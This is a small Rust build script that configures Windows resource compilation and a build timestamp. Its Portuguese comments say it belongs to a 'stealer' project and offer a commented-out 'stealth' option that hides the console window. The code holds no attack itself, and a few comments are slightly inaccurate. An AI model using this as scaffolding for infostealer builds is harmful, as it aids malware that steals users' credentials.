// build.rs
fn main() {
    #[cfg(target_os = "windows")]
    {
        // Isso NÃO afeta seu stealer em runtime
        // Só configura como o executável é compilado
        let mut res = winres::WindowsResource::new();
        
        // Opcional: remove a janela do console (modo stealth)
        // Comente essa linha se quiser ver o console para debug
        // res.set("Subsystem", "WINDOWS");
        
        res.compile().unwrap_or_else(|e| {
            println!("cargo:warning=winres failed: {}", e);
        });
    }
    
    // Mostra mensagem durante a compilação
    println!("cargo:rerun-if-changed=build.rs");
    println!("cargo:rustc-env=BUILD_TIME={}", chrono::Utc::now().to_rfc3339());
}